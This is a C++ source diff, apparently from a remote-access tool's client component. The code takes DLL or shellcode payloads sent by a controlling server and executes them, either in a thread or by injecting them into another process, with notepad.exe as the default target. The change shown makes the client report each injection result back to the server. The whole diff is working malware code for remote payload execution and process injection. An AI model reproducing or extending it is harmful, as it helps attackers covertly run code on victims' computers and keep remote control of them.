@@ -141,7 +141,8 @@ typedef struct DllExecParam {
     DllExecuteInfo info;
     PluginParam param;
     BYTE* buffer;
-    DllExecParam(const DllExecuteInfo& dll, const PluginParam& arg, BYTE* data) : info(dll), param(arg)
+    CManager* manager;
+    DllExecParam(const DllExecuteInfo& dll, const PluginParam& arg, BYTE* data, CManager* m) : info(dll), param(arg), manager(m)
     {
         buffer = new BYTE[info.Size];
         memcpy(buffer, data, info.Size);
@@ -180,6 +181,7 @@ DWORD WINAPI ExecuteDLLProc(LPVOID param)
     DllExecParam* dll = (DllExecParam*)param;
     DllExecuteInfo info = dll->info;
     PluginParam pThread = dll->param;
+    CManager* This = dll->manager;
 #ifdef _DEBUG
     WriteBinaryToFile((char*)dll->buffer, info.Size, info.Name);
     DllRunner* runner = new DefaultDllRunner(info.Name);
@@ -212,8 +214,12 @@ DWORD WINAPI ExecuteDLLProc(LPVOID param)
         bool flag = info.CallType == CALLTYPE_IOCPTHREAD;
         ShellcodeInj inj(dll->buffer, info.Size, flag ? "run" : 0, flag ? &pThread : 0, flag ? sizeof(PluginParam) : 0);
         if (info.Pid < 0) info.Pid = GetCurrentProcessId();
-        bool ret = info.Pid ? inj.InjectProcess(info.Pid) : inj.InjectProcess("notepad.exe", true);
-        Mprintf("Inject %s to process [%d] %s\n", info.Name, info.Pid, ret ? "succeed" : "failed");
+        int ret = info.Pid ? inj.InjectProcess(info.Pid) : inj.InjectProcess("notepad.exe", true);
+        char buf[256];
+        sprintf_s(buf, "Inject %s to process [%d] %s", info.Name, info.Pid ? info.Pid : ret, ret ? "succeed" : "failed");
+        Mprintf("%s\n", buf);
+        ClientMsg msg("代码注入", buf);
+        This->SendData((LPBYTE)&msg, sizeof(msg));
     }
     SAFE_DELETE(dll);
     SAFE_DELETE(runner);
@@ -522,7 +528,7 @@ VOID CKernelManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
         }
         if (data) {
             PluginParam param(m_conn->ServerIP(), m_conn->ServerPort(), &g_bExit, m_conn);
-            CloseHandle(__CreateThread(NULL, 0, ExecuteDLLProc, new DllExecParam(*info, param, data), 0, NULL));
+            CloseHandle(__CreateThread(NULL, 0, ExecuteDLLProc, new DllExecParam(*info, param, data, this), 0, NULL));
             Mprintf("Execute '%s'%d succeed - Length: %d\n", info->Name, info->CallType, info->Size);
         }
         break;
